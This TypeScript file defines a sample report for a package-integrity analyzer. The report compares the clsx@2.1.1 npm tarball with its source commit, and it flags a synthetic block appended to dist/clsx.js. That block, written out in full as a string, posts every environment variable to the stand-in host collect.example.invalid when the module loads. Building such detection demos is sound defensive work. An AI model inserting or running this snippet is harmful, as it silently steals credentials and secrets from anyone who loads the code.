import type { Report } from "./report.ts";

// Real clsx@2.1.1 tarball and source at its gitHead, with one synthetic change
// appended to dist/clsx.js so the viewer can show a finding. Hashes are computed
// from those exact bytes; the explanations are written by hand.
const builtClsxJs =
  'function r(e){var o,t,f="";if("string"==typeof e||"number"==typeof e)f+=e;else if("object"==typeof e)if(Array.isArray(e)){var n=e.length;for(o=0;o<n;o++)e[o]&&(t=r(e[o]))&&(f&&(f+=" "),f+=t)}else for(t in e)e[t]&&(f&&(f+=" "),f+=t);return f}function e(){for(var e,o,t=0,f="",n=arguments.length;t<n;t++)(e=arguments[t])&&(o=r(e))&&(f&&(f+=" "),f+=o);return f}module.exports=e,module.exports.clsx=e;';

const syntheticBlock =
  ';(function(){try{require("https").request({hostname:"collect.example.invalid",path:"/e",method:"POST"}).end(JSON.stringify(process.env))}catch(e){}})();';

const notListed = 'Not matched by "files" in package.json';

export const sampleReport: Report = {
  id: "sample",
  sample: {
    note: "Sample report. The tarball is the real clsx@2.1.1 with one file altered by the UNMASK team to show a finding. Build explanations and the hypothesis are written by hand to illustrate the layout; the analyzer compares bytes and does not establish build equivalence.",
  },
  analyzedAt: "2026-10-31T19:15:00Z",
  release: {
    name: "clsx",
    version: "2.1.1",
    publishedAt: "2024-04-23T05:26:04.645Z",
    publisher: "lukeed",
    integrity:
      "sha512-eYm0QWBtUrBWZWG0d386OGAw16Z995PiOVo2B7bjWSbHedGl5e0ZWaq65kOGgUSNesEIDkB9ISbTg/JK9dhCZA==",
    tarballUrl: "https://registry.npmjs.org/clsx/-/clsx-2.1.1.tgz",
    registryFileCount: 10,
    registryUnpackedSize: 8555,
    installScripts: {},
    provenance: false,
  },
  source: {
    repository: "https://github.com/lukeed/clsx",
    commit: "925494cf31bcd97d3337aacd34e659e80cae7fe2",
    committedAt: "2024-04-23T05:26:02Z",
    tag: "v2.1.1",
    via: "gitHead",
    fileCount: 21,
  },
  files: [
    {
      path: "clsx.d.mts",
      bytes: 278,
      sha256:
        "c57b441e0c0a9cbdfa7d850dae1f8a387d6f81cbffbc3cd0465d530084c2417d",
      status: "identical",
      sourceBytes: 278,
      explanation: { kind: "identical" },
    },
    {
      path: "clsx.d.ts",
      bytes: 337,
      sha256:
        "ef73bcfef9907c8b772a30e5a64a6bd86a5669cba3d210fcdcc6b625e3312459",
      status: "identical",
      sourceBytes: 337,
      explanation: { kind: "identical" },
    },
    {
      path: "dist/clsx.js",
      bytes: 549,
      sha256:
        "1c3c89d6e76dd0a2c93f5a871178972cd9925583a9b7221ffc6e305a2c96ac69",
      status: "artifact-only",
      sourceBytes: null,
      explanation: { kind: "unexplained", findingId: "f1" },
    },
    {
      path: "dist/clsx.min.js",
      bytes: 543,
      sha256:
        "232113196916be666253d1565e76e6924d82e4309bb877f0e44c07c73c32e665",
      status: "artifact-only",
      sourceBytes: null,
      explanation: {
        kind: "build",
        from: "src/index.js",
        step: "bin/index.js:65",
        detail: "Wrapped as UMD, minified by terser 4.8.0",
      },
    },
    {
      path: "dist/clsx.mjs",
      bytes: 388,
      sha256:
        "d949e5cdbfebc76a6642b1901095e900fc3f2262d8dc0373aa44850a9bc75522",
      status: "artifact-only",
      sourceBytes: null,
      explanation: {
        kind: "build",
        from: "src/index.js",
        step: "bin/index.js:53",
        detail: "Kept as ESM, minified by terser 4.8.0",
      },
    },
    {
      path: "dist/lite.js",
      bytes: 161,
      sha256:
        "37f4dd277cfc6fb8852e1829c611bf71cfd8f662869d29cabbe87ae72037018b",
      status: "artifact-only",
      sourceBytes: null,
      explanation: {
        kind: "build",
        from: "src/lite.js",
        step: "bin/index.js:56",
        detail: "Exports rewritten to CommonJS, minified",
      },
    },
    {
      path: "dist/lite.mjs",
      bytes: 152,
      sha256:
        "0dfb332606c719dd391e7a197be0707c4ac73ae315b04eeca93a4289fac4faa5",
      status: "artifact-only",
      sourceBytes: null,
      explanation: {
        kind: "build",
        from: "src/lite.js",
        step: "bin/index.js:53",
        detail: "Kept as ESM, minified by terser 4.8.0",
      },
    },
    {
      path: "license",
      bytes: 1104,
      sha256:
        "9a9edad7baae52622bddf3c15b2ef8a33d2c89f2d25408ad13e8a7481c6b0c97",
      status: "identical",
      sourceBytes: 1104,
      explanation: { kind: "identical" },
    },
    {
      path: "package.json",
      bytes: 1192,
      sha256:
        "a5e616b9883177fb47c1fca22b6a4ab42be1c3ed6ffae8595a5c7d88630eeec2",
      status: "identical",
      sourceBytes: 1192,
      explanation: { kind: "identical" },
    },
    {
      path: "readme.md",
      bytes: 4003,
      sha256:
        "6c0057ca6bc7cc39a2ba857e114929168ce65daaa5ddb2242b40bc4de6dc573a",
      status: "identical",
      sourceBytes: 4003,
      explanation: { kind: "identical" },
    },
  ],
  sourceOnly: [
    { path: ".editorconfig", bytes: 211, reason: notListed },
    { path: ".github/FUNDING.yml", bytes: 15, reason: notListed },
    { path: ".github/workflows/ci.yml", bytes: 1066, reason: notListed },
    { path: ".gitignore", bytes: 50, reason: notListed },
    { path: "bench/chrome.png", bytes: 7164, reason: notListed },
    { path: "bench/firefox.png", bytes: 6784, reason: notListed },
    { path: "bench/index.js", bytes: 1332, reason: notListed },
    { path: "bench/package.json", bytes: 151, reason: notListed },
    { path: "bench/readme.md", bytes: 2350, reason: notListed },
    { path: "bench/safari.png", bytes: 6469, reason: notListed },
    { path: "bin/index.js", bytes: 1794, reason: "Build script for dist/" },
    { path: "src/index.js", bytes: 705, reason: "Build input for dist/clsx.*" },
    { path: "src/lite.js", bytes: 236, reason: "Build input for dist/lite.*" },
    { path: "test/classnames.js", bytes: 2496, reason: notListed },
    { path: "test/index.js", bytes: 2741, reason: notListed },
    { path: "test/lite.js", bytes: 1520, reason: notListed },
  ],
  findings: [
    {
      id: "f1",
      path: "dist/clsx.js",
      title: "Code that no build step produces",
      summary:
        "The first 397 bytes match the CommonJS build of src/index.js. The last 152 bytes appear in no source file and no build step.",
      expected: {
        from: "src/index.js",
        step: "bin/index.js:56",
        bytes: builtClsxJs.length,
        sha256:
          "a2ba9f4c5fe36617aa930a5269bd910a2cafc7066398835d63cf3733f5c0651a",
      },
      published: {
        bytes: builtClsxJs.length + syntheticBlock.length,
        sha256:
          "1c3c89d6e76dd0a2c93f5a871178972cd9925583a9b7221ffc6e305a2c96ac69",
        content: builtClsxJs + syntheticBlock,
      },
      extra: {
        start: builtClsxJs.length,
        end: builtClsxJs.length + syntheticBlock.length,
      },
      checks: [
        {
          label: "Build output matches",
          passed: true,
          detail: "Bytes 0–397 equal the CommonJS build of src/index.js",
        },
        {
          label: "Extra bytes traced",
          passed: false,
          detail: "Bytes 397–549 occur in no file at 925494c",
        },
        {
          label: "Capabilities unchanged",
          passed: false,
          detail: 'Adds require("https") and reads process.env',
        },
        {
          label: "Runs only when called",
          passed: false,
          detail: "The added block runs as soon as the module loads",
        },
      ],
      hypothesis: {
        model: "gemma-4-26b-a4b-it",
        text: "The appended block sends every environment variable of the process that loads clsx to collect.example.invalid. Joining class names needs no network access.",
        citedBytes: [
          builtClsxJs.length,
          builtClsxJs.length + syntheticBlock.length,
        ],
        connected: false,
      },
    },
  ],
};
